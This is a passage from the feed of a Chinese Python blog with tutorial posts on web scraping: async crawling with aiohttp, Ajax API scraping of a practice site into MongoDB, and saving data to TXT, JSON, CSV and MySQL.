class="keyword">return</span> <span class="keyword">await</span> self.crawl_api(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">crawl_detail</span>(<span class="params">self, <span class="built_in">id</span></span>):</span></span><br><span class="line">        print(<span class="string">&#x27;id&#x27;</span>, <span class="built_in">id</span>)</span><br><span class="line">        url = DETAIL_URL.<span class="built_in">format</span>(<span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line">        data = <span class="keyword">await</span> self.crawl_api(url)</span><br><span class="line">        <span class="keyword">await</span> self.save_data(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        logging.info(<span class="string">&#x27;saving data %s&#x27;</span>, data.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">await</span> collection.update_one(&#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: data.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                <span class="string">&#x27;$set&#x27;</span>: data</span><br><span class="line">            &#125;, upsert=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.session = aiohttp.ClientSession()</span><br><span class="line">        crawl_index_tasks = [asyncio.ensure_future(self.crawl_index(page)) <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, PAGE_NUMBER + <span class="number">1</span>)]</span><br><span class="line">     <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        gather 和 wait 区别：</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        wait(tasks) 使用一个set保存它创建的Task实例。因为set是无序的所以任务不会顺序执行。</span></span><br><span class="line"><span class="string">        wait的返回值是一个元组，包括两个集合，分别表示已完成和未完成的任务。wait第二个参数为一个超时值。</span></span><br><span class="line"><span class="string">        达到这个超时时间后，未完成的任务状态变为pending，当程序退出时还有任务没有完成此时就会看到错误提示。</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        gather(*tasks) 和 wait 不同的是。 1.gather任务无法取消；2.返回值是一个结果列表；3.可以按照传入参数的顺序，顺序输出。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        results = <span class="keyword">await</span> asyncio.gather(*crawl_index_tasks)</span><br><span class="line">        print(<span class="string">&#x27;results:&#x27;</span>, results)</span><br><span class="line">        ids = []</span><br><span class="line">        <span class="keyword">for</span> index_data <span class="keyword">in</span> results:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> index_data:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> index_data.get(<span class="string">&#x27;results&#x27;</span>):</span><br><span class="line">                ids.append(item.get(<span class="string">&#x27;id&#x27;</span>))</span><br><span class="line">        crawl_detail_tasks = [asyncio.ensure_future(self.crawl_detail(<span class="built_in">id</span>)) <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> ids]</span><br><span class="line">        <span class="keyword">await</span> asyncio.wait(crawl_detail_tasks)</span><br><span class="line">        <span class="keyword">await</span> self.session.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    spider = Spider()</span><br><span class="line">    loop.run_until_complete(spider.main())</span><br></pre></td></tr></table></figure><p>爬取过程如下：</p><p><img data-src="https://s2.loli.net/2022/02/23/Hw7Vxz16nWrBYFX.png"></p><p>可以看到书籍都存到了 MongoDB 中：</p><img data-src="https://s2.loli.net/2022/02/23/52dkJOrNYMIfaDn.png" alt="" style="zoom:80%;" />]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/02/15/MUcb8kYIRaP21gN.png&quot; style=&quot;zoom: 67%;&quot; /&gt;

&lt;p&gt;爬虫是 IO 密集型任务，当使用 requests 库爬虫某个站点，发出请求后必须等待网站返回响应，才能继续运行，那有没有可以优化的方案呢？本章来了解一下异步爬虫的概念。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记五 -- Ajax 数据爬取</title>
    <link href="https://speedpromise.github.io/archives/4ca1a587.html"/>
    <id>https://speedpromise.github.io/archives/4ca1a587.html</id>
    <published>2022-02-22T02:58:41.000Z</published>
    <updated>2022-02-22T08:21:01.783Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/02/22/xCpa2HQnmMqcX3P.png" style="zoom: 67%;" /><p>现在越来越多的页面数据都是异步加载的，原始页面开始不会包含某些数据，等原始页面加载完后，再向服务器通过 Ajax 请求后获取呈现的，本章我们就来认识一下 Ajax。</p><span id="more"></span><p>Ajax，全称是 Asynchronous JavaScript and XML，即异步的 JavaScript 和 XML，它是一种在保证页面不被刷新、页面链接不改变的情况下实现页面内容局部刷新的技术。</p><p>以<a href="https://m.weibo.cn/u/2830678474">微博</a>为例，页面上划加载更多的功能就有用到 Ajax 技术，打开浏览器开发者工具，选择网络，选择 XHR 标签，可筛选出来， 其标志是请求头中带有<code>X-Requested-With: XMLHttpRequest</code>。同时查看 Preview(预览)项，可看到获取的数据，这也为我们爬取数据提供了思路。</p><p><img data-src="https://s2.loli.net/2022/02/22/yLPbOZCNHx8E7tw.png"></p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>本节爬取网站和本系列第二篇内容基本一样，只不过后台数据处理的逻辑和数据加载方式不一样：<a href="https://spa1.scrape.center/">链接</a></p><p><img data-src="https://s2.loli.net/2022/02/22/t7Yeyfqhp3u1PAB.png"></p><p>点击页码，筛选请求，发现其 Ajax 请求基础 URL 为<code>https://spa1.scrape.center/api/movie/</code>，主要参数有两个，<code>limit</code>和<code>offset</code>，前者固定为 10，后者为页码 * 10。电影详情页链接为<code>https://spa1.scrape.center/api/movie/20/</code>最后的参数是可变的，且这个 id 在爬取列表页数据时已经获得，爬取的结果是结构化的 JSON 数据，无需额外解析。</p><p><img data-src="https://s2.loli.net/2022/02/22/R4wC9UMKGxkPYjg.png"></p><p>下面开始写代码，用到了 logging 库来输出信息，pymongo 库来存储数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s : %(message)s&#x27;</span>)</span><br><span class="line">TOTAL_PAGE = <span class="number">10</span></span><br><span class="line">LIMIT = <span class="number">10</span></span><br><span class="line">INDEX_URL = <span class="string">&#x27;https://spa1.scrape.center/api/movie/?limit=&#123;limit&#125;&amp;offset=&#123;offset&#125;&#x27;</span></span><br><span class="line">DETAIL_URL = <span class="string">&#x27;https://spa1.scrape.center/api/movie/&#123;id&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">MONGO_CONNECTION = <span class="string">&#x27;mongodb://localhost:27017&#x27;</span></span><br><span class="line">MONGO_DB = <span class="string">&#x27;movies&#x27;</span></span><br><span class="line">MONGO_COLLECTION = <span class="string">&#x27;movies&#x27;</span></span><br><span class="line"></span><br><span class="line">client = pymongo.MongoClient(MONGO_CONNECTION)</span><br><span class="line">db = client[MONGO_DB]</span><br><span class="line">collection = db[MONGO_COLLECTION]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl_api</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    crawl page by url and return its html</span></span><br><span class="line"><span class="string">    :param url: page url</span></span><br><span class="line"><span class="string">    :return: html of the page</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.json()</span><br><span class="line">        logging.error(<span class="string">&#x27;get invalid status code %s while crawling %s&#x27;</span>, response.status_code, url)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException:</span><br><span class="line">        logging.error(<span class="string">&#x27;error occurred while crawling %s&#x27;</span>, url, exc_info=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl_index</span>(<span class="params">page</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    crawl index page</span></span><br><span class="line"><span class="string">    :param page: page of index page</span></span><br><span class="line"><span class="string">    :return: html of index page</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    index_url = INDEX_URL.<span class="built_in">format</span>(limit=LIMIT, offset=LIMIT * (page - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> crawl_api(index_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl_detail</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取详情页数据，id 列表页数据中获取</span></span><br><span class="line"><span class="string">    :param id: 电影 id</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    url = DETAIL_URL.<span class="built_in">format</span>(<span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> crawl_api(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Save data to MongoDB，这里会有去重的功能，但实际电影是会有同名现象</span></span><br><span class="line"><span class="string">    :param data:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    collection.update_one(&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: data.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="string">&#x27;$set&#x27;</span>: data</span><br><span class="line">    &#125;, upsert=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">page</span>):</span></span><br><span class="line">    index_data = crawl_index(page)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> index_data.get(<span class="string">&#x27;results&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> item:</span><br><span class="line">            <span class="built_in">id</span> = item.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">            print(<span class="string">&#x27;id&#x27;</span>, <span class="built_in">id</span>)</span><br><span class="line">            detail_data = crawl_detail(<span class="built_in">id</span>)</span><br><span class="line">            logging.info(<span class="string">&#x27;get detail data %s&#x27;</span>, detail_data)</span><br><span class="line">            save_data(detail_data)</span><br><span class="line">            logging.info(<span class="string">&#x27;data saved successfully&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;item data is None, something wrong...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  <span class="comment"># Pycharm 输入快捷键 main</span></span><br><span class="line">    pool = multiprocessing.Pool()</span><br><span class="line">    pages = <span class="built_in">range</span>(<span class="number">1</span>, TOTAL_PAGE + <span class="number">1</span>)</span><br><span class="line">    pool.<span class="built_in">map</span>(main, pages)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/02/22/xCpa2HQnmMqcX3P.png&quot; style=&quot;zoom: 67%;&quot; /&gt;

&lt;p&gt;现在越来越多的页面数据都是异步加载的，原始页面开始不会包含某些数据，等原始页面加载完后，再向服务器通过 Ajax 请求后获取呈现的，本章我们就来认识一下 Ajax。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记四 -- 数据的存储</title>
    <link href="https://speedpromise.github.io/archives/39ed07bf.html"/>
    <id>https://speedpromise.github.io/archives/39ed07bf.html</id>
    <published>2022-02-20T07:23:08.000Z</published>
    <updated>2022-02-22T04:34:13.598Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/02/15/2z4tLguB3OP8nN6.png" style="zoom:67%;" /><p>解析库解析出数据后，可以将数据保存文本文件，如 TXT、JSON、CSV 等，也可以将数据保存到数据库 MySQL，非关系型数据库 MongoDB、Redis 等，另外，还可以直接把数据存储到搜索引擎（如 Elasticsearch）中，以便检索和查看。</p><span id="more"></span><h3 id="TXT-文本文件存储"><a href="#TXT-文本文件存储" class="headerlink" title="TXT  文本文件存储"></a>TXT  文本文件存储</h3><p>基本用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file.<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file.write(<span class="string">f&#x27;名称：<span class="subst">&#123;name&#125;</span>\n&#x27;</span>)</span><br><span class="line">file.close()</span><br><span class="line"><span class="comment">#简化写法</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">file.write(<span class="string">f&#x27;名称：<span class="subst">&#123;name&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>文件打开方式包括：</p><ul><li>r：以只读方式打开，默认；</li><li>rb：以二进制只读方式打开，通常用于音频、图片、视频等二进制文件；</li><li>r+：以读写方式打开；</li><li>rb+：以二进制读写方式打开；</li><li>w：以写入方式打开，如存在则覆盖，不存在则新建；</li><li>wb：以二进制写入方式打开，如存在则覆盖，不存在则新建；</li><li>w+：以读写方式打开，如存在则覆盖，不存在则新建；</li><li>wb+：以二进制读写方式打开，如存在则覆盖，不存在则新建；</li><li>a：以追加方式打开，如存在则追加到已有内容后，不存在则新建；</li><li>ab：以二进制追加方式打开，如存在则追加到已有内容后，不存在则新建；</li><li>a+：以读写方式打开，如存在则追加到已有内容后，不存在则新建；</li><li>ab+：以二进制追加方式，如存在则追加到已有内容后，不存在则新建；</li></ul><h3 id="JSON-文件存储"><a href="#JSON-文件存储" class="headerlink" title="JSON 文件存储"></a>JSON 文件存储</h3><p>基本用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 JSON，JSON 字符串中必须使用双引号，不然会报错</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#123;</span></span><br><span class="line"><span class="string">    &quot;name&quot;: &quot;Bob&quot;,</span></span><br><span class="line"><span class="string">    &quot;gender&quot;: &quot;male&quot;</span></span><br><span class="line"><span class="string">&#125;, &#123;</span></span><br><span class="line"><span class="string">    &quot;name&quot;: &quot;Selina&quot;,</span></span><br><span class="line"><span class="string">    &quot;gender&quot;: &quot;female&quot;</span></span><br><span class="line"><span class="string">&#125;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">data = json.loads(text) </span><br><span class="line">print(data1)</span><br><span class="line">print(<span class="built_in">type</span>(data2))</span><br><span class="line"><span class="comment"># load 方法传入文件对象，使用 open 方法读取；loads 传入 JSON 字符串，使用更灵活</span></span><br><span class="line">data2 = json.load(<span class="built_in">open</span>(<span class="string">&#x27;data.json&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">[&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;male&#x27;</span>&#125;, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Selina&#x27;</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;female&#x27;</span>&#125;]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"># 输出 <span class="title">JSON</span></span></span><br><span class="line"><span class="class"><span class="title">with</span> <span class="title">open</span>(<span class="params"><span class="string">&#x27;data.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>) <span class="title">as</span> <span class="title">file</span>:</span></span><br><span class="line">    <span class="comment"># 使用 intend 参数可保存为 JSON 对象缩进格式，表示缩进字符个数</span></span><br><span class="line">    <span class="comment"># 默认输出 Unicode 字符，使用 ensure_ascii=False 可输出中文</span></span><br><span class="line">    file.write(json.dumps(data, indent=<span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="CSV-文件存储"><a href="#CSV-文件存储" class="headerlink" title="CSV 文件存储"></a>CSV 文件存储</h3><p>基本用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file: <span class="comment"># 可加 encodeing 指定编码格式</span></span><br><span class="line">    writer = csv.writer(file) <span class="comment"># 可加 delimiter=&#x27; &#x27; 参数，自定义输入内容分隔符</span></span><br><span class="line">    writer.writerow([<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>])</span><br><span class="line">    writer.writerow([<span class="string">&#x27;10001&#x27;</span>, <span class="string">&#x27;Mike&#x27;</span>, <span class="string">&#x27;20&#x27;</span>])</span><br><span class="line">    writer.writerows([[<span class="string">&#x27;10002&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;21&#x27;</span>], [<span class="string">&#x27;10003&#x27;</span>, <span class="string">&#x27;Jodan&#x27;</span>, <span class="string">&#x27;21&#x27;</span>]])</span><br><span class="line">    </span><br><span class="line">------------- result -------------</span><br><span class="line">data.csv:</span><br><span class="line"><span class="built_in">id</span>,name,age</span><br><span class="line"><span class="number">10001</span>,Mike,<span class="number">20</span></span><br><span class="line"><span class="number">10002</span>,Bob,<span class="number">21</span></span><br><span class="line"><span class="number">10003</span>,Jodan,<span class="number">21</span></span><br><span class="line">----------------------------------</span><br><span class="line"><span class="comment"># 字典写入方式</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    fieldnames = [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>]</span><br><span class="line">    writer = csv.DictWriter(file, fieldnames=fieldnames)</span><br><span class="line">    writer.writeheader()</span><br><span class="line">    writer.writerow(&#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;10001&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Mike&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="string">&#x27;20&#x27;</span>&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 读取</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    reader = csv.reader(file)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        print(row)</span><br></pre></td></tr></table></figure><h3 id="MySQL-存储"><a href="#MySQL-存储" class="headerlink" title="MySQL 存储"></a>MySQL 存储</h3><p>关系型数据库是基于关系的数据库，而关系模型是基于二维表来保存的，所以关系型数据库中数据的存储方式就是行列组成的表，每一列代表一个字段、每一行代表一条记录。表可以看做实体的集合，实体之间存在的联系需要通过表与表之间的关联关系体现，例如主键和外键的关联关联。由多个表组成的数据库，就是关系型数据库。</p><p>关系型数据库有很多，如 SQLite、MySQL、Oracle、SQL Server、DB2 等，本节主要了解 MySQL 数据库的存储操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可同时指定数据库和编码方式，参数为 db, charset</span></span><br><span class="line">db = pymysql.connect(host=<span class="string">&#x27;localhost&#x27;</span>, user=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, port=<span class="number">3306</span>)</span><br><span class="line">cursor = db.cursor()</span><br><span class="line">cursor.execute(<span class="string">&#x27;SELECT VERSION()&#x27;</span>)</span><br><span class="line">data = cursor.fetchone()</span><br><span class="line">print(<span class="string">&#x27;Database version: &#x27;</span>, data)</span><br><span class="line"><span class="comment"># 数据库和数据表都可以手动新建</span></span><br><span class="line">cursor.execute(<span class="string">&quot;CREATE DATABASE spiders DEFAULT CHARACTER SET utf8mb4&quot;</span>)</span><br><span class="line">cursor.execute(<span class="string">&quot;CREATE TABLE IF NOT EXISTS students (id VARCHAR(255) NOT NULL, name VARCHAR(255) NOT NULL, age INT NOT NULL, PRIMARY KEY(id))&quot;</span>)</span><br><span class="line">db.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入数据</span></span><br><span class="line"><span class="built_in">id</span> = <span class="string">&#x27;20220220&#x27;</span></span><br><span class="line">user = <span class="string">&#x27;Bob&#x27;</span></span><br><span class="line">age = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">db = pymysql.connect(host=<span class="string">&#x27;localhost&#x27;</span>, user=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, port=<span class="number">3306</span>, db=<span class="string">&#x27;spiders&#x27;</span>)</span><br><span class="line">cursor = db.cursor()</span><br><span class="line">sql = <span class="string">&#x27;INSERT INTO students(id, name, age) values(%s, %s, %s)&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor.execute(sql, (<span class="built_in">id</span>, user, age))</span><br><span class="line">    <span class="comment"># 数据增删改都需要 commit 操作</span></span><br><span class="line">    db.commit()</span><br><span class="line">    print(<span class="string">&#x27;Data inserted successfully&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> pymysql.Error <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 执行失败则执行数据回滚</span></span><br><span class="line">    db.rollback()</span><br><span class="line">    print(e.args[<span class="number">0</span>], e.args[<span class="number">1</span>])</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><strong>事务</strong>机制能够保证数据的完整性，例如插入一条数据，要么全部插入，要么都不插入，这就是事务的原子性，其他还有三个属性——一致性、隔离性和持久性，这四个属性通常称为 ACID 特性：</p><ul><li>原子性（atomicity）：事务是一个不可分割的工作单位，事务中包括的操作要么都做、要么都不做。</li><li>一致性（consistency）：事务必须从一个一致性状态变到另一个一致性状态。一致性和原子性是密切相关的。</li><li>隔离性（isolation）：一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。</li><li>持久性（durability）：也成永久性（permanence），指一个事务一旦提交，它对数据库中数据做的改变就该是永久性的。接下来的操作或故障不应该对数据有任何影响。</li></ul><p>上面的插入操作有一个弊端，如果需要增加字段，就需要该 SQL 语句，很不方便，我们可以将其改为一个通过方法，只需传入一个动态变化的字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span 